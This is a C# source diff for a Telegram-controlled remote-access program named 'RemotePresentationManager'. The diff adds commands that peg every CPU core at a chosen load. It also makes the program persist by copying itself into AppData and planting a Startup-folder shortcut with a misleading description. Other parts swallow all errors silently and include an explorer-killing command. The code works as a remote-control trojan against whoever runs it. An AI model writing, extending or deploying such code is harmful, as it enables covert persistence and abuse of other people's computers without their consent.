@@ -1,4 +1,5 @@
-﻿using NAudio.Wave;
+﻿using IWshRuntimeLibrary;
+using NAudio.Wave;
 using Payloads;
 using System;
 using System.Collections.Generic;
@@ -81,48 +82,56 @@ namespace RemotePresentationManager
 
         private async void CheckCommand(Message m)
         {
-            if (m.Type == Telegram.Bot.Types.Enums.MessageType.Text && !Authenticated)
+            try
             {
-                if (m.Text.Equals("/start"))
+                if (m.Type == Telegram.Bot.Types.Enums.MessageType.Text && !Authenticated)
                 {
-                    await Client.SendTextMessageAsync(m.Chat, "Connected");
-                    return;
-                }
-                else if (m.Text.Equals("/stop"))
-                {
-                    await Client.SendTextMessageAsync(m.Chat, "Disconnecting...");
-                    CurrentChat = null;
-                    return;
-                }
-                else if (m.Text.StartsWith("/auth"))
-                {
-                    if (CheckPassword(m.Text.Remove(0, 6)))
+                    if (m.Text.Equals("/start"))
                     {
-                        Authenticated = true;
-                        await Client.SendTextMessageAsync(m.Chat, "Authenticated");
-                        await Client.DeleteMessageAsync(m.Chat, m.MessageId);
+                        await Client.SendTextMessageAsync(m.Chat, "Connected");
                         return;
                     }
-                    else
+                    else if (m.Text.Equals("/stop"))
                     {
-                        await Client.SendTextMessageAsync(m.Chat, "Wrong password");
-                        await Client.DeleteMessageAsync(m.Chat, m.MessageId);
+                        await Client.SendTextMessageAsync(m.Chat, "Disconnecting...");
+                        CurrentChat = null;
                         return;
                     }
-                }
-            }
-
-            if (Authenticated)
-            {
-                switch (m.Type)
-                {
-                    case Telegram.Bot.Types.Enums.MessageType.Text:
+                    else if (m.Text.StartsWith("/auth"))
+                    {
+                        if (CheckPassword(m.Text.Remove(0, 6)))
                         {
-                            CheckTextCommand(m);
-                            break;
+                            Authenticated = true;
+                            await Client.SendTextMessageAsync(m.Chat, "Authenticated");
+                            await Client.DeleteMessageAsync(m.Chat, m.MessageId);
+                            return;
                         }
+                        else
+                        {
+                            await Client.SendTextMessageAsync(m.Chat, "Wrong password");
+                            await Client.DeleteMessageAsync(m.Chat, m.MessageId);
+                            return;
+                        }
+                    }
+                }
+
+                if (Authenticated)
+                {
+                    switch (m.Type)
+                    {
+                        case Telegram.Bot.Types.Enums.MessageType.Text:
+                            {
+                                CheckTextCommand(m);
+                                break;
+                            }
+                    }
                 }
             }
+            catch (Exception)
+            {
+
+            }
+            
         }
 
         private async void CheckTextCommand(Message m)
@@ -306,6 +315,18 @@ namespace RemotePresentationManager
                 Explorer();
                 Console.WriteLine("KILL EXPLORER");
             }
+            else if (m.Text.StartsWith("/cpu"))
+            {
+                await Client.SendTextMessageAsync(m.Chat, "OK");
+                Cpu(m.Text);
+                Console.WriteLine("CPU COMMAND");
+            }
+            else if (m.Text.Equals("/nocpu"))
+            {
+                await Client.SendTextMessageAsync(m.Chat, "OK");
+                NoCpu();
+                Console.WriteLine("NOCPU COMMAND");
+            }
             else if (m.Text.Equals("/startup"))
             {
                 await Client.SendTextMessageAsync(m.Chat, "OK");
@@ -378,15 +399,29 @@ namespace RemotePresentationManager
 
         private void Startup()
         {
+            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager");
             string exe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager", "RemotePresentationManager.exe");
-            string bat = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\RPM.bat");
+            string token = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager", "token.txt");
+            string lnk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\RPM.lnk");
             Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager"));
             if (File.Exists(exe))
             {
                 File.Delete(exe);
             }
             File.Copy(Application.ExecutablePath, exe);
-            File.WriteAllText(bat, String.Format("start {0} {1}", exe, "WEBONLY"));
+            if (File.Exists(token))
+            {
+                File.Delete(token);
+            }
+            File.Copy("token.txt", token);
+            //File.WriteAllText(bat, String.Format("start {0} {1}", exe, "WEBONLY"));
+            WshShell shell = new WshShell();
+            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnk);
+            shortcut.Description = "r/programmerhumor";
+            shortcut.TargetPath = exe;
+            shortcut.Arguments = "WEBONLY";
+            shortcut.WorkingDirectory = path;
+            shortcut.Save();
         }
 
         private void Explorer()
@@ -735,6 +770,48 @@ namespace RemotePresentationManager
                      Client.SendTextMessageAsync(CurrentChat, ex.GetType() + ": " + ex.Message);
                 }
             }).Start();
+        }
+
+        private void Cpu(string text)
+        {
+            if (text.Length > 5)
+            {
+                string s = text.Remove(0, 5);
+                try
+                {
+                    Program.Form1.CPUPercentage = int.Parse(s);
+                }
+                catch (Exception)
+                {
+                    return;
+                }
+            }
+            Program.Form1.IsCPURunning = true;
+            for(int i = 0; i < Environment.ProcessorCount; i++)
+            {
+                new Thread(new ThreadStart(() => {
+                    if (Program.Form1.CPUPercentage < 0 || Program.Form1.CPUPercentage > 100)
+                        return;
+                    Stopwatch watch = new Stopwatch();
+                    watch.Start();
+                    while (Program.Form1.IsCPURunning)
+                    {
+                        // Make the loop go on for "Program.Form1.CPUPercentage" milliseconds then sleep the 
+                        // remaining Program.Form1.CPUPercentage milliseconds. So 40% utilization means work 40ms and sleep 60ms
+                        if (watch.ElapsedMilliseconds > Program.Form1.CPUPercentage)
+                        {
+                            Thread.Sleep(100 - Program.Form1.CPUPercentage);
+                            watch.Reset();
+                            watch.Start();
+                        }
+                    }
+                })).Start();
+            }
+        }
+
+        private void NoCpu()
+        {
+            Program.Form1.IsCPURunning = false;
         }
 
         public void SendMessage(string message)
